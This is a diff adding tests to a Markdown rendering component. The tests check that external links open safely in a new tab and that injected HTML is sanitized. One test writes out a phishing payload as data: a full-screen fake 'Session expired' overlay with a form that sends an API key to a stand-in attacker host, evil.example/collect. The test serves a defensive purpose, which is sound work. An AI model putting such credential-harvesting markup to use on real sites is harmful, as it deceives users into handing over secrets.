@@ -26,4 +26,34 @@ describe("Markdown", () => {
     expect(root?.querySelector("a")?.hasAttribute("href")).toBe(false);
     expect(screen.getByText("unsafe")).toBeTruthy();
   });
+
+  it("opens external links in a new tab without exposing the opener", () => {
+    const view = render(() => <Markdown source={"[docs](https://example.test/docs) and [local](/api/issues)"} />);
+    const [external, local] = Array.from(view.container.querySelectorAll("a"));
+    expect(external?.getAttribute("target")).toBe("_blank");
+    expect(external?.getAttribute("rel")).toBe("noopener noreferrer");
+    expect(local?.getAttribute("target")).toBeNull();
+  });
+
+  it("opens protocol-relative and mixed-case external links in a new tab", () => {
+    const view = render(() => <Markdown source={"[a](//evil.example/x) [b](HTTPS://evil.example/y)"} />);
+    for (const link of Array.from(view.container.querySelectorAll("a"))) {
+      expect(link.getAttribute("target")).toBe("_blank");
+      expect(link.getAttribute("rel")).toBe("noopener noreferrer");
+    }
+  });
+
+  it("strips markup that could spoof application UI or collect credentials", () => {
+    const payload =
+      '<div style="position:fixed;inset:0;z-index:99999;background:#fff"><h2>Session expired</h2><form action="https://evil.example/collect"><label>API Key <input type="password" name="key"></label><button type="submit">Sign in</button></form></div>';
+    const view = render(() => <Markdown source={payload} />);
+    const root = view.container.querySelector(".markdown-body")!;
+    expect(root.querySelector("form")).toBeNull();
+    expect(root.querySelector("input")).toBeNull();
+    expect(root.querySelector("button")).toBeNull();
+    expect(root.querySelector("[style]")).toBeNull();
+    expect(screen.getByText("Session expired")).toBeTruthy();
+    // Named props would otherwise let content shadow modal aria-labelledby ids.
+    expect(root.querySelector('[id^="cl-"]')).toBeNull();
+  });
 });
